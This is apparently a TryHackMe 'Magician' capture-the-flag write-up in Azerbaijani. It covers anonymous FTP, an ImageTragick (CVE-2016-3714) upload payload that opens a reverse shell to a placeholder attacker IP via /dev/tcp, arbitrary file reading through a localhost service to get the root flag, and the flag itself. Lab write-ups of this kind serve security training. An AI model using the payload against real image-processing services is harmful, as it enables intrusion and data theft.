# TryHackMe — Magician Writeup
**Çətinlik:** Easy  
**Kateqoriya:** CVE-2016-3714, ImageTragick, RCE, Port Forwarding  
**Link:** https://tryhackme.com/room/magician

---

## Xülasə

Bu lab ImageMagick kitabxanasındakı kritik zəifliyi (CVE-2016-3714) istismar etməkdən ibarətdir. FTP-dən ipucu alaraq PNG yükləmə forması vasitəsilə reverse shell əldə edirik. Daha sonra localhost-da gizli xidmət tapıb root flagını oxuyuruq.

---

## 1. Kəşfiyyat (Reconnaissance)

### /etc/hosts faylına hostname əlavə et

```bash
echo "10.80.138.76 magician" | sudo tee -a /etc/hosts
```

> **Qeyd:** Sayt IP ilə deyil, hostname ilə işləyir. Bu addım olmadan upload işləmir.

### Nmap Skan

```bash
nmap -sV -sC -p- magician
```

**Açıq portlar:**

| Port | Xidmət | Qeyd |
|------|--------|------|
| 21   | FTP (vsftpd) | Anonymous giriş mövcuddur |
| 8080 | HTTP (Java backend) | Spring Boot API |
| 8081 | HTTP (nginx) | PNG→JPG converter saytı |

---

## 2. FTP Kəşfiyyatı

```bash
ftp magician
# Name: anonymous
# Password: (boş — sadəcə ENTER)
```

**FTP giriş mesajı:**
```
230-Huh? The door just opens after some time? You're quite the patient
one, aren't ya, it's a thing called 'delay_successful_login' in
/etc/vsftpd.conf ;) Since you're a rookie, this might help you to get
started: https://imagetragick.com. You might need to do some little
tweaks though...
```

**İpucular:**
- `delay_successful_login` — server qəsdən gec cavab verir, səbr et
- `imagetragick.com` → **CVE-2016-3714** zəifliyinə işarə edir

---

## 3. Veb Tətbiqin Araşdırılması

`http://magician:8081` — PNG-dən JPG-yə çevirən sayt.

Arxada **ImageMagick** kitabxanası işləyir → ImageTragick exploit tətbiq oluna bilər.

---

## 4. İlkin Giriş — ImageTragick (CVE-2016-3714)

### Exploit Faylının Hazırlanması

```bash
cat > image.png << 'EOF'
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/KALI_IP/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```

### Netcat Listener

```bash
nc -lvnp 4444
```

### Upload

`http://magician:8081` saytına `image.png` faylını yüklə → Shell gəlir!

```
magician@magician:~$
```

---

## 5. User Flag

```bash
cat /home/magician/user.txt
```

---

## 6. Privilege Escalation — Gizli Port

### İpucu faylı

```bash
cat /home/magician/the_magic_continues
```

```
The magician is known to keep a locally listening cat up his sleeve,
it is said to be an oracle who will tell you secrets if you are good
enough to understand its meows.
```

### Açıq portları yoxla

```bash
netstat -tulnp
```

```
tcp   0   0 127.0.0.1:6666   0.0.0.0:*   LISTEN
```

**Port 6666** yalnız localhost-da açıqdır!

### curl ilə porta daxil ol

```bash
curl http://127.0.0.1:6666
```

"The Magic cat" adlı fayl oxuyan veb tətbiq — `filename` parametri qəbul edir.

---

## 7. Root Flag

```bash
curl http://127.0.0.1:6666 -d "filename=/root/root.txt&submit=Submit"
```

**Hex cavab gəlir:**
```
54484d7b6d616769635f6d61795f6d616b655f6d616e795f6d656e5f6d61647d0a
```

**Decode et:**
```bash
echo "54484d7b6d616769635f6d61795f6d616b655f6d616e795f6d656e5f6d61647d0a" | xxd -r -p
```

```
THM{magic_may_make_many_men_mad}
```

---

## 8. Attack Zənciri (Attack Chain)

```
Anonymous FTP → ImageTragick ipucu
      ↓
CVE-2016-3714 exploit (image.png upload)
      ↓
Reverse Shell (magician user)
      ↓
user.txt FLAG ✅
      ↓
netstat → Port 6666 (localhost)
      ↓
curl → Magic cat (LFI)
      ↓
/root/root.txt → Root FLAG ✅
```

---

## 9. Öyrənilən Dərslər

| Mövzu | İzah |
|-------|------|
| **CVE-2016-3714** | ImageMagick-in xüsusi fayl formatlarını işlədərkən əmr icra etməsi |
| **delay_successful_login** | vsftpd-nin giriş gecikmə parametri |
| **hostname vs IP** | Bəzi veb tətbiqlər yalnız hostname ilə düzgün işləyir |
| **Port Forwarding** | Chisel/curl ilə localhost portlarına giriş |
| **LFI (Local File Inclusion)** | filename parametri ilə ixtiyari fayl oxuma |
| **Hex Decode** | `xxd -r -p` ilə hex-dən mətn |

---

## 10. İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanı |
| `ftp` | Anonymous FTP girişi |
| `nc (netcat)` | Reverse shell listener |
| `curl` | HTTP sorğuları |
| `netstat` | Açıq portların yoxlanması |
| `xxd` | Hex decode |

---

*Writeup by: [Sənin adın]*  
*Tarix: 2026-08-24*
